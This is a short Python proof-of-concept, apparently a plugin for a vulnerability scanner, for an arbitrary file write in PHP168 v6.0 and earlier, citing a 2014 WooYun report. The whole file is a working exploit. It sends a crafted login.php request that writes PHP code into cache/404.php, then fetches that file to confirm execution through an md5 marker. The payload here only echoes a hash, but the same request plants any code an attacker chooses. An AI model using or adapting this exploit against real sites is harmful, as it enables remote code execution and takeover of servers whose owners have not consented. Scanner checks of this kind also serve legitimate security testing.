#!/usr/bin/evn  python 
#-*-:coding:utf-8:-*-  

#__author__=="wonderkun"
#Name:php168的login.php存在重大安全漏洞 
#影响版本: v6.0及以下 
#Refer:http://wooyun.org/bugs/wooyun-2014-050515  


def assign (service,arg):
    if service=="php168":
        return True,arg

        
def audit(arg):
    url=arg
    payload="/login.php?makehtml=1&chdb[htmlname]=404.php&chdb[path]=cache&content=<?php%20echo%20md5(1);?>"
    code, head, res, errcode, _ = curl.curl(url+payload)
    verify_url=arg+'/cache/404.php'
    code, head, res, errcode, _ =curl.curl(verify_url)
    if code==200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
        security_hole(arg+'/login.php')

if  __name__ == '__main__': 
    from dummy import *
    audit(assign('php168','http://www.example.com')[1])
